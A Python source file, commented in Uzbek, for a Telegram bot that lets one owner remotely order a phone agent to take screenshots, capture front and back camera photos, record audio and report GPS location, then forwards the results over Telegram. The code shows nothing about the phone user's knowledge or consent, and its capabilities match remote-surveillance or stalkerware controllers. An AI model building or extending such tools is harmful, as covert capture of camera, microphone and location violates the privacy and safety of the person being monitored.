"""Hullas bot — telefon agent buyruqlari (HTTP polling orqali).

Buyruqlar: /screenshot, /cam_back, /cam_front, /record, /location, /device
"""
from __future__ import annotations

import asyncio
import html
import io
import logging
import os
from datetime import datetime, timedelta, timezone
from pathlib import Path

from telethon import TelegramClient, events

from device_store import DeviceStore

log = logging.getLogger(__name__)

_UZT = timedelta(hours=5)
_DEVICE_API = os.environ.get("DEVICE_API_URL", "http://127.0.0.1:5555")
_UPLOAD_DIR = Path(os.environ.get("UPLOAD_DIR", "/tmp/hullas_uploads"))
_DB_PATH = Path(os.environ.get("DEVICE_DB_PATH", "/opt/hullas/device.db"))
_TIMEOUT = int(os.environ.get("DEVICE_TIMEOUT", "90"))

_store = DeviceStore(_DB_PATH)


def register_app_handlers(
    bot: TelegramClient,
    db,
    owner_id: int,
    account1_user_id: int | None = None,
) -> None:
    """Telefon agent buyruqlarini ro'yxatga olish."""

    def _is_owner(event) -> bool:
        return event.sender_id == owner_id

    @bot.on(events.NewMessage(pattern="/screenshot$", func=_is_owner))
    async def cmd_screenshot(event):
        await _run_device_cmd(event, "screenshot", {})

    @bot.on(events.NewMessage(pattern="/cam_back$", func=_is_owner))
    async def cmd_cam_back(event):
        await _run_device_cmd(event, "cam_back", {})

    @bot.on(events.NewMessage(pattern="/cam_front$", func=_is_owner))
    async def cmd_cam_front(event):
        await _run_device_cmd(event, "cam_front", {})

    @bot.on(events.NewMessage(pattern="/photo$", func=_is_owner))
    async def cmd_photo(event):
        await _run_device_cmd(event, "cam_back", {})

    @bot.on(events.NewMessage(pattern=r"/record(?:\s+(\d+))?$", func=_is_owner))
    async def cmd_record(event):
        secs = event.pattern_match.group(1)
        duration = max(5, min(int(secs) if secs else 10, 120))
        await _run_device_cmd(event, "record", {"duration": duration})

    @bot.on(events.NewMessage(pattern="/location$", func=_is_owner))
    async def cmd_location(event):
        await _run_device_cmd(event, "location", {})

    @bot.on(events.NewMessage(pattern="/device$", func=_is_owner))
    async def cmd_device(event):
        info = _store.last_seen()
        if not info:
            await event.respond("📱 Telefon agent ulanmagan.")
            return
        try:
            dt = datetime.fromisoformat(info["last_seen"])
            local = dt.astimezone(timezone.utc) + _UZT
            ago = datetime.now(timezone.utc) - dt.replace(tzinfo=timezone.utc)
            mins = int(ago.total_seconds() / 60)
            status = "🟢 Onlayn" if mins < 2 else f"🟡 {mins} daqiqa oldin"
        except ValueError:
            local = info["last_seen"]
            status = "?"
        device = html.escape(info.get("device_info") or "Noma'lum")
        await event.respond(
            f"📱 <b>Telefon agent</b>\n"
            f"Holat: {status}\n"
            f"Qurilma: {device}\n"
            f"Oxirgi: <code>{local}</code>",
            parse_mode="html",
        )

    async def _run_device_cmd(event, cmd: str, args: dict) -> None:
        cmd_id = _store.create_command(cmd, args)
        labels = {
            "screenshot": "Ekran nusxasi",
            "cam_back": "Orqa kamera",
            "cam_front": "Old kamera",
            "record": f"Audio ({args.get('duration', 10)}s)",
            "location": "Lokatsiya",
        }
        label = labels.get(cmd, cmd)
        await event.respond(f"⏳ {label} — buyruq yuborildi...")

        for _ in range(_TIMEOUT):
            row = _store.get_command(cmd_id)
            if row and row["status"] in ("done", "failed"):
                await _deliver(bot, owner_id, cmd, row)
                return
            await asyncio.sleep(1)

        _store.complete_command(cmd_id, "timeout", {"error": "timeout"})
        await event.respond(
            f"⏱ <b>{label}</b> — javob kelmadi.\n"
            "Telefon agent ishlayaptimi? /device tekshiring.",
            parse_mode="html",
        )


async def _deliver(
    bot: TelegramClient,
    owner_id: int,
    cmd: str,
    row: dict,
) -> None:
    result = row.get("result") or {}
    status = row["status"]

    if status == "failed":
        err = html.escape(result.get("error") or result.get("message") or "xato")
        await bot.send_message(owner_id, f"❌ <b>{cmd}</b>: {err}", parse_mode="html")
        return

    if cmd == "location":
        lat = result.get("lat")
        lon = result.get("lon")
        if lat and lon:
            maps = f"https://maps.google.com/?q={lat},{lon}"
            await bot.send_message(
                owner_id,
                f"📍 <b>Lokatsiya</b>\n"
                f"Lat: <code>{lat}</code>\n"
                f"Lon: <code>{lon}</code>\n"
                f"<a href='{maps}'>Google Maps</a>",
                parse_mode="html",
                link_preview=False,
            )
        else:
            await bot.send_message(owner_id, "❌ Lokatsiya olinmadi.")
        return

    filename = result.get("filename")
    if not filename:
        await bot.send_message(owner_id, f"❌ {cmd}: fayl yo'q.")
        return

    path = _UPLOAD_DIR / filename
    if not path.exists():
        await bot.send_message(owner_id, f"❌ {cmd}: fayl topilmadi.")
        return

    data = path.read_bytes()
    buf = io.BytesIO(data)
    buf.name = filename

    captions = {
        "screenshot": "📸 Ekran nusxasi",
        "cam_back": "📷 Orqa kamera",
        "cam_front": "🤳 Old kamera",
        "record": "🎙 Audio yozuv",
    }
    caption = captions.get(cmd, f"📎 {cmd}")

    if cmd == "record":
        await bot.send_file(owner_id, buf, caption=caption, voice_note=False)
    else:
        await bot.send_file(owner_id, buf, caption=caption)

    try:
        path.unlink()
    except OSError:
        pass